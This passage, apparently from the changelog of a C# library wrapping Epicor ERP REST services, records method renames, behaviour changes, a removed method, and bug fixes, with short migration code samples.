  | `BySearchWordAsync` | `GetPartsBySearchWordsAsync` | `Get*` to match `GetByID*` convention; `Parts` plural communicates that multiple matches are possible; `Words` plural matches Epicor's column name. |
  | `FindOrderByPONumAsync` | `GetByPONumAsync` | `Get*` to match `GetByID*` convention. Also a substantial behavior change — see the separate entry below. |
  | `UDCodeLookUpAsync` | `GetUDCodeDescriptionAsync` | Verb-first shape (`Get*`) matches other reads; the new name also describes the actual return type (a description string, not a UDCodes object). |

  Method *case-sensitivity* on PascalCase parameters (e.g. `CreateOrderAsync(string CustID, DateTime NeedByDate, string PONum)`) is preserved as-is. Epicor is inconsistent about column casing across tables, and the parameter casing in these methods deliberately mirrors the column casing in the table being acted on. C# named-argument syntax is case-sensitive, so this is a deliberate choice.

- **`SalesOrderSvc.FindOrderByPONumAsync` → `GetByPONumAsync` — behavior and return type both changed.** *Breaking, beyond a rename.* The old method returned `OperationResult<List<OrderHed>>` containing rows with only `OrderNum` populated, and required the caller to make a follow-up `GetByIDAsync` to fetch the full dataset. The new method returns `OperationResult<JObject>` — the wide multi-table dataset directly — and accomplishes the same flow internally with two BO calls (`SalesOrders` filter → `GetByID`). PO numbers are expected to be unique per order at the Epicor installation level, so the method returns at most one order's dataset. When no order matches the PO, the failure has a 404-shape with a PO-specific message (`"PONum 'X' does not match any sales order"`). Migration for the typical case is a simplification:

  ```csharp
  // Before — two steps, three lines, narrow then wide
  var lookup = await client.SalesOrder.FindOrderByPONumAsync("PO12345");
  if (lookup.IsFailure || lookup.Value.Count == 0) return;
  var full = await client.SalesOrder.GetByIDAsync(lookup.Value[0].OrderNum);

  // After — one step
  var full = await client.SalesOrder.GetByPONumAsync("PO12345");
  ```

  For callers who only need the bare `OrderNum` (rare — most callers want the full dataset eventually), the equivalent is now a direct call to the OData wrapper: `client.SalesOrder.SalesOrdersAsync(filters: new List<string> { "PONum eq 'PO12345'" }, select: new List<string> { "OrderNum" })`.

- **`ChangePartUnitPriceAsync` moved from `PartSvc.Workflows.cs` to `PartSvc.cs`.** Not breaking — the method is still reached the same way through the partial class (`client.Part.ChangePartUnitPriceAsync(...)`). The structural move is a convention cleanup: the method's primary BO call is `Erp.BO.PartSvc/ChangePartUnitPrice` (matching the Keri method name exactly per the BO-wrapper convention), with `CheckPartChanges` as a prerequisite step and `UpdateExt` as the persist step. By the rule "BO wrappers go in `*Svc.cs`; orchestrators that compose multiple independently-meaningful operations go in `*Svc.Workflows.cs`," this method belongs in `PartSvc.cs`. The composition (three BO calls) is implementation detail, not a developer-facing workflow.

- **No more inline URL building in `*Svc.Workflows.cs` files.** Four workflow methods were building Epicor URLs directly via `string svc = "Erp.BO.PartSvc/Parts"; svc += "?$select=..."` etc., bypassing the public OData wrappers. The convention rule — workflows compose BO-wrapper method calls, they don't build URLs — is now uniformly enforced. `GetPartsBySearchWordsAsync` now calls `PartsAsync` with the filter pre-applied; `GetByPONumAsync` calls `SalesOrdersAsync` then `GetByIDAsync`. `ChangePartUnitPriceAsync` moved out of workflows entirely (see above). The fourth offender (`GetNewPartRevAsync` in workflows, which built its own `GetNewPartRev` URL) is resolved by adding a public `GetNewPartRevAsync` BO wrapper to `PartSvc.cs` (template-fetch only, no persist) and having `AddPartRevAsync` in workflows call that wrapper plus the existing `UpdateAsync`.

- **`PartSvc.GetNewPartRevAsync` — new public BO wrapper.** Added to `PartSvc.cs` as part of the workflow-rename batch above. This is the raw template-fetch (calls `Erp.BO.PartSvc/GetNewPartRev`, returns the empty PartRev template dataset, does not persist). Distinct from the workflow's `AddPartRevAsync` which composes this template fetch with `UpdateAsync` to actually create and persist a revision. Both names coexist deliberately: `GetNewPartRevAsync` for callers who want fine-grained control over the create flow, `AddPartRevAsync` for the standard "give me a revision under this part" case.

- **`PartSvc.cs` method order normalized to group writes together.** All write methods now sit consecutively (`UpdateAsync` → `UpdateExtAsync` → `ChangePartUnitPriceAsync` → `DuplicatePartAsync`); reads (`PartsAsync`, `PartAttchesAsync`, `GetListAsync`, `GetByIDAsync`, `CheckPartChangesAsync`) and templates (`GetNewPartAsync`, `GetNewPartRevAsync`) precede them in semantic groups. Pure reorder — no signature or behavior change. Companion to the earlier method-ordering normalization across five services.

- **Comment conventions polish across the codebase.** Section-comment dividers (`// ---` blocks separating method groups) added to three services that had been navigating-by-indent: `PartSvc` (2 dividers — OData entity-set wrappers / BO action wrappers), `UDXSvc` (3 dividers — public utility helpers / BO action wrappers / destructive operations), and `VendorSvc` (2 dividers, with a small accompanying method reorder so the OData wrappers and BO action wrappers form contiguous groups). `MenuSvc` evaluated and judged not to need dividers — its four methods are two generic+typed overload pairs in a single logical group. Companion change: `OperationResult<T>` factory methods (`Success`, `Failure(string,...)`, `Failure(Exception,...)`) gained complete `<param>` and `<returns>` XML documentation, bringing the codebase to 116/116 public methods with complete XML docs. Three more stale `<see cref>` references caught in a second-sweep audit and fixed: `Dtos/OrderHed.cs` referenced the now-renamed `FindOrderByPONumAsync` (prose updated to point at `SalesOrdersAsync` since the renamed `GetByPONumAsync` no longer returns a list), `Platform/ProjectSvc.cs` carried three references to the renamed `NewProjectAsync` in its class-level remarks and an internal-API comment, `Sales/SalesOrderSvc.cs` had stale orchestrator names in its class-level remark and a process-step section header. None of these caused compile errors, but they broke IDE navigation (F12) and misled readers about which methods exist.

- **`EpicorClient` sealed against inheritance.** The facade pattern's intent — "one connection, many services, all disposed together" — is explicit in the class doc-comment and in the absence of any `protected`/`virtual` members. Marking the class `sealed` makes the intent compiler-enforced: consumers extending an `EpicorClient` should use composition (wrap the client in their own class that exposes the services they want and adds their own) rather than inheritance, which is the .NET-idiomatic pattern for client-style classes. *Technically breaking* for anyone who had inherited from `EpicorClient`, but no such consumer exists at this stage of the library's life.

### Removed

- **`CustomerSvc._CustomerByCustIDAsync` deleted.** *Breaking.* The method had two problems: an underscore prefix that violated the naming convention (it was the last underscore-prefixed straggler from a prior cleanup pass), and a structural redundancy with `CustomersAsync` — both methods called the same `Erp.BO.CustomerSvc/Customers` OData endpoint, differing only in which query parameter they sent. The widened `CustomersAsync` (see `### Changed`) now subsumes both behaviors through its `filters` parameter. Migration:

  ```csharp
  // Before
  var result = await client.Customer._CustomerByCustIDAsync("ACME01");

  // After
  var result = await client.Customer.CustomersAsync(
      filters: new List<string> { "CustID eq 'ACME01'" });
  ```

  Note that `CustID eq '...'` normally matches exactly one customer; use `result.Value.FirstOrDefault()` to get the single row, same as before.

### Fixed

- **`VendorSvc.VendCntsAsync` — `$filter` clause was built without URL encoding.** The clause `VendorNum eq {n}` was assembled by `String.Format` and concatenated directly onto the URL, while every other entity-set wrapper in the library runs its filter through `UrlEncode`. The space and `eq` happened to pass through cleanly with an integer value on the right-hand side, so the bug was latent — but a future contributor changing the filter to use a string value or a more complex predicate would have hit a malformed-URL failure mode that the rest of the library doesn't have. The clause now goes through `UrlEncode`, matching `CustomersAsync` and `VendorsAsync` and the rest of the OData wrappers.

- **`FileHandling.ConvertJArrayToCSV` — `data[0]` threw on an empty `JArray`.** The method read column names from the first row without guarding for an empty array, throwing `ArgumentOutOfRangeException`. It now returns an empty string for null or empty input, matching the already-guarded `ConvertJArrayToHTMLTable`.

- **Request-URL building is now tolerant of stray slashes.** The transport built the request URL by concatenating the environment, URL modifier, and service path directly, so a missing or doubled slash at any seam produced a malformed URL. URL building now normalizes each seam to a single `/`, tolerating a stray trailing slash on the environment (a common copy-paste artifact) and leading/trailing slashes on the modifier and service path.

- **`UDXSvc.GetAllAsync` and `GetByIDAsync` — `$select` was dropping `Key1`–`Key5`, returning rows with empty key values.** When the column-allowlist removal that accompanied the `ExtraData` work landed, the new exclusion set wrongly included the key columns alongside operation-controlled and container properties. The keys were treated as "set explicitly elsewhere" — which is true on the write path, where they appear as separate `JProperty` entries — but on the read paths there is no "elsewhere," and the `$select` is the only place they could be requested. Epicor obligingly returned rows without them. The exclusion set now contains only properties that genuinely aren't columns (`RowMod`, `Company`, `ExtraData`), and a single iteration over the serialized DTO drives both the write payload and the read `$select` — one source of truth, keys included.

- **Two README examples called `client.Customer.GetListAsync(...)` — a method that doesn't exist on `CustomerSvc`.** The first example (the facade-snippet around line 218) and the `OperationResult<T>` walkthrough (around line 249) both called `GetListAsync` against `CustomerSvc`, which only has `CustomersAsync` (OData) and `GetByIDAsync`. The second example additionally assigned the return of `GetByIDAsync` (which is `OperationResult<JObject>`) to a `Customer` typed variable, which wouldn't compile. Both examples now use `CustomersAsync` with proper OData filter syntax (`new List<string> { "Inactive eq false" }` and `new List<string> { "CustID eq 'CUST001'" }`), with the second example doing a `FirstOrDefault()` materialization and a null-check that mirrors how a real caller would handle a single-row filtered read.

- **Six `.cs` files contained raw 0x97 bytes — invalid UTF-8 where there should be em-dashes.** A scope correction worth being honest about: a prior `CLEANUP_RECOMMENDATIONS.md` entry claimed twenty files were affected by Windows-1252-encoded em-dashes leaking into the source. A strict UTF-8 decode of every `.cs` file turned up only six actually-broken files (10 stray 0x97 bytes total): `EpicorSvc.cs`, `AR/PayMethodSvc.cs`, `AR/PaymentEntrySvc.cs`, `Inventory/SerialNoSvc.cs`, `MasterData/SalesRepSvc.cs`, and `Platform/GenxDataSvc.cs`. The other fourteen files I'd flagged contained byte 0x80 or 0x94, but as the middle and last bytes of the *valid* three-byte UTF-8 em-dash sequence `\xE2\x80\x94` — perfectly correct, just visually surprising in a hex dump. The genuine breakage in the six files was likely introduced by editors interpreting the source as Windows-1252 and writing a single 0x97 byte where the original UTF-8 em-dash (three bytes) had been. C# tooling tolerated this in comments and XML doc text, so the code built and ran without complaint, but strict-UTF-8 readers (linters, doc generators, some code-review tools) would flag invalid byte sequences. Fixed by replacing each 0x97 byte with the proper UTF-8 em-dash sequence; every `.cs` file in the repo now decodes cleanly as UTF-8.

- **Three stale `<see cref>` references in DTOs pointed at underscore-prefixed method names that no longer exist.** `Dtos/QuoteInput.cs` referenced `QuoteSvc._NewQuoteHedAsync`, `Dtos/MscShpDt.cs` and `Dtos/MiscShipLineInput.cs` both referenced `MiscShipSvc._AddMscShpDtAsync`. The underscore prefix was a legacy convention dropped in an earlier cleanup pass; the methods themselves were renamed without their `<see cref>` consumers being updated. Stale `<see cref>` references compile silently but break IDE navigation (F12 / Go to Definition) and produce warnings under some doc-comment validators. Updated to point at the current method names — `QuoteSvc.CreateQuoteAsync` (the post-rename name for the quote-creation orchestrator) and `MiscShipSvc.AddMscShpDtAsync` (no longer underscore-prefixed).

- **`FileHandling` build warnings MSB3277 and MSB3836 suppressed.** Both warnings describe situations that the project deliberately handles but that MSBuild flags anyway. MSB3277 fires on the `net48` target because `ClosedXML` is a `netstandard2.0` library that transitively expects newer versions of `System.Memory`, `System.Buffers`, `System.Numerics.Vectors`, and `System.Runtime.CompilerServices.Unsafe` than the .NET Framework 4.8 facade assemblies provide. `App.config`'s `<bindingRedirect>` entries resolve this conflict at runtime — the warning is a build-time complaint about a state that is already correctly handled. MSB3836 fires on the `net8.0` target because `<AutoGenerateBindingRedirects>` produces its own redirects that overlap with the hand-coded ones in `App.config` (which are there for the `net48` runtime path). Same underlying root cause, same "already handled" character. Both suppressed via `<NoWarn>$(NoWarn);MSB3277;MSB3836</NoWarn>` in `FileHandling.csproj`, with an explanatory comment alongside the suppression so future readers can tell at a glance that this is a known-benign suppression rather than a hidden bug. Alternative fixes (explicit BCL-facade package pins, removing the App.config redirects) were attempted or considered and rejected as more invasive than the situation warrants.

---

## [0.1.0] — 2026-05-17

Initial release.

### Added

- **`EpicorSvcs` — 20 Epicor service wrappers, all async.** Every service method ends in `Async`, returns `Task<OperationResult<T>>`, and accepts an optional `CancellationToken`. Services: `BAQ`, `Menu`, `UserCodes`, `GenxData`, `UDX`, `Project`, `Customer`, `Vendor`, `Part`, `SalesRep`, `PayMethod`, `PaymentEntry`, `SerialNo`, `MiscShip`, `SelectedSerialNumbers`, `InvTransfer`, `BomSearch`, `EngWorkBench`, `Quote`, `SalesOrder`.

- **`EpicorClient` facade.** A disposable wrapper that holds one configured session and lazy-constructs each service on first access — the recommended entry point — one connection, many services, all disposed together.

- **`OperationResult<T>` return type.** The standard return for every service call. Carries success/failure state, the typed value (on success), an error message and HTTP status (on failure), the resource path, and the raw `JObject` response as an escape hatch. Reading `Value` on a failure returns `default(T)` rather than throwing, so the `IsFailure` check is mandatory.

- **Typed DTOs for the practical core of every BO.** `Customer`, `Part`, `OrderHed`, `OrderDtl`, `Quote`, `UDRow`, and ~35 more, in `EpicorSvcs/Dtos/`. DTOs ship only the columns every Epicor install has; install-specific `_c` columns are intentionally not modeled and remain accessible via `OperationResult.RawResponse`.

- **`UDXSvc` column-legend convention.** A row may declare what each generic UD column means by encoding a `column:meaning` map into `Character10`. Helpers `UDXSvc.BuildColumnLegend` and `UDXSvc.ParseColumnLegend` build and parse the encoding; `UDRow.ToMappedValues()` re-keys a row's values by their declared meanings. A convention only — the framework does not enforce it.

- **Typed-projection pattern (`GetRowsAsync<T>`).** Generic service methods that let callers receive responses as their own narrow DTO with just the columns they need, ignoring the rest. Used by `MenuSvc.GetRowsAsync<T>` and similar.

- **Orchestrators split into `*Svc.Workflows.cs` partial-class files.** Composed multi-call operations (`NewOrderAsync`, `MoveInventoryAsync`, `AddMtlsAsync`, etc.) live separately from the thin BO wrappers in `*Svc.cs`. Both files declare the same `public partial class`. The split is for contributors; callers see one unified service.

- **`RESTServices` — HttpClient-based transport.** Authentication (Basic auth and v2 OData API key), session management, URL building, JSON error handling. Built on `HttpClient`. Transport failures surface the underlying cause (DNS, connection refused, TLS) by walking the inner-exception chain rather than reporting only the generic outer message.

- **`FileHandling` — Excel and email helpers.** `FileProcessing.EmailReport` runs the canonical "data → Excel/CSV → email" pipeline. Excel reading and writing via ClosedXML (`ExcelReader` / `ExcelWriter`), CSV via direct serialization. SMTP via `Emailer.Send`, which dispatches to `System.Net.Mail.SmtpClient` on .NET Framework and `MailKit.Net.Smtp.SmtpClient` on .NET 8.0+ — same public API, same configuration, same behavior across both targets. Supports optional STARTTLS and authentication via `SMTPPort` / `SMTPEnableSsl` / `SMTPUsername` / `SMTPPassword` settings. Email-related DTOs (`EmailSpecs`, `EMailMeta`) live in `FileHandling/Dtos/`.

- **`EpicorSvcDemo` — end-to-end runnable sample.** Runs a BAQ, builds an Excel attachment, emails it. The canonical "this is what Keri does" example.

- **`EpicorSvcPOCs` — per-feature runnable examples.** Five labeled scenarios (UserCodes, Part, UDX, SalesOrder, MenuTree) demonstrating reads, the column-legend convention, the typed-projection pattern, and gated writes. Write operations require `KERI_POC_ALLOW_WRITES=true`; otherwise they dry-run and print the payload they *would* send.

- **`KineticRESTIntegrator.Tests` — xUnit unit test project.** 52 offline, deterministic tests covering `OperationResult<T>` factories and extensions, `UDRow` serialization behavior (including the `[JsonProperty(NullValueHandling.Ignore)]` design on Date columns), and the `UDXSvc` column-legend helpers. Runs without an Epicor connection.

- **Three credential sources, layered.** Programmatic session (for user-facing apps and multi-tenant scenarios), `App.config` (per-developer local), and environment variables (CI / production / containers). Sources stack: programmatic bypasses both others; env vars override `App.config` row by row.

- **Environment selector via `DefaultEnvironment`.** Named environments (`live`/`pilot`/`test`) defined once in `Env*` settings; `DefaultEnvironment` selects which to use. Per-run override via `EPICOR_ENV`, per-block override via `new EpicorClient("pilot")`, literal-URL override for one-off connections.

- **Multi-target build: `net48` and `net8.0`.** The three library projects (`RESTServices`, `EpicorSvcs`, `FileHandling`) each produce both `net48` and `net8.0` binaries. Consumers on .NET Framework get the `net48` build; consumers on .NET 8.0+ get the `net8.0` build. Public API is identical across both targets. Consumer projects (`EpicorSvcDemo`, `EpicorSvcPOCs`, the test project) remain single-target `net48`.

- **Apache License 2.0.** See [LICENSE](LICENSE) and [NOTICE](NOTICE).

### Notes

- **Pre-1.0.** The API may change in 0.x releases without a deprecation period. Not yet in production use anywhere; not yet independently reviewed by another team.
- **Target frameworks: `net48` and `net8.0`.** The library multi-targets .NET Framework 4.8 and .NET 8.0. The internal SMTP implementation differs (`System.Net.Mail` on net48, MailKit 4.16.0+ on net8.0) but the contract is identical.

---

[0.3.0]: https://github.com/mrjtgrant/KineticRESTIntegrator/releases/tag/v0.3.0
[0.1.0]: https://github.com/mrjtgrant/KineticRESTIntegrator/releases/tag/v0.1.0
